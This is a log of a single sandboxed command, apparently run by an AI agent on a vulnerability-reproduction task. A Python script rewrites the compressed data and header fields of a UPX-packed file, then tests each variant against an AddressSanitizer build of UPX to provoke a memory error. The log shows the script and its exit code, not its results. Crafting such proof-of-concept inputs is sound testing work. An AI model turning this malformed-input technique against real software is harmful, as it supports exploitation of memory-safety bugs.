message:
Command `cd /workspace && python3 - <<'PY'
import pathlib,struct,subprocess,shutil
seed=bytearray(pathlib.Path('hello.upx').read_bytes())
binfo=256; dataoff=268; orig_clen=262; phoff=5408
for n in [24,32,48,52,56,60,63,64,80,128,232]:
 comp=pathlib.Path(f'/tmp/out{n}').read_bytes()
 p=bytearray(seed)
 # replace compressed header with new comp, adjust following bytes by keeping length? if shorter, pad with original leftover? c_len says shorter, next b_info/data start earlier, so need delete delta not pad
 delta=orig_clen-len(comp)
 p[dataoff:dataoff+orig_clen]=comp
 if delta>0:
  del p[dataoff+len(comp):dataoff+orig_clen]
 elif delta<0:
  p[dataoff+orig_clen:dataoff+orig_clen]=b'\0'*(-delta)
 struct.pack_into('<I',p,binfo,n); struct.pack_into('<I',p,binfo+4,len(comp))
 # update ph at shifted offset? final pack header shifted by -delta; but find_overlay uses trailer pack header and overlay offset stored after header. since bytes shifted, phoff becomes phoff-delta; overlay stored after header = 236 unchanged. no need?
 fn=f'/tmp/poc_n{n}.bin'; pathlib.Path(fn).write_bytes(p)
 r=subprocess.run(['/workspace/repo-vul/src-vul/asanbuild/upx','-t',fn],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=10)
 out=r.stdout.decode('latin1','replace')
 print('\nN',n,'clen',len(comp),'len',len(p),'rc',r.returncode,'asan',('ERROR: AddressSanitizer'in out))
 print('\n'.join(out.splitlines()[-8:]))
 if 'ERROR: AddressSanitizer' in out:
  print(out[:4000]); break
PY` executed with exit code 0.
